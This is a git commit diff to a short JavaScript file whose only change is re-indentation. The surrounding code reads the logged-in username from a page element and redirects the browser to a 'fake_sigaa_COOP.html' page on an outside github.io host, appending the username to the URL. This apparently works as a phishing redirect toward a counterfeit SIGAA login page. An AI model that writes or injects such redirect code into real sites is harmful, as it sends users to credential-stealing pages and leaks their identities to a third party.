dea4add113f580efe535ffe60d711370715e7c5d
Rodrigo Rocha <2rptecnologia@gmail.com>
2019-01-20 08:21:26 -0200

    Update redirecionar_COOP.js

--- js/redirecionar_COOP.js
+++ js/redirecionar_COOP.js
@@ -1,7 +1,7 @@
 var x = document.getElementById("info-usuario").innerHTML;
-			y = x.split('title=');
-			y = y[1].split('>')
-			y = y[1].split('<')
+		y = x.split('title=');
+		y = y[1].split('>')
+		y = y[1].split('<')
 
 window.location.href = "https://rodrigorochapinto.github.io/pages-teste/paginas/fake_sigaa_COOP.html?usuario="+y
 
